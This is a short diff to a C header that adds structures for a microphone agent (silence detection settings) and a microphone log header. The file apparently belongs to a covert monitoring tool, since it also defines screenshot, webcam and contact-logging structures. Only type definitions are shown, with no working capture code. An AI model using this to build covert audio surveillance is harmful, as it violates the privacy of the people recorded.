@@ -400,6 +400,11 @@ typedef struct _screenshot {
   u_int grabNewWindows; // 1 TRUE onNewWindow - 0 FALSE
 } screenshotStruct;
 
+typedef struct _microphone {
+  u_int detectSilence;
+  u_int silenceThreshold;
+} microphoneAgentStruct;
+
 // Massimo Chiodini - 05/08/2009
 typedef struct _webcam {
   u_int sleepTime;
@@ -565,6 +570,14 @@ enum contactType {
   Birthday                  = 0x31,
   Anniversary               = 0x32
 };
+
+typedef struct _microphoneHeader {
+  u_int version;
+#define LOG_MICROPHONE_VERSION 2008121901
+  u_int sampleRate;
+  u_int hiTimestamp;
+  u_int loTimestamp;
+} microphoneAdditionalStruct;
 
 #pragma pack(2)
 
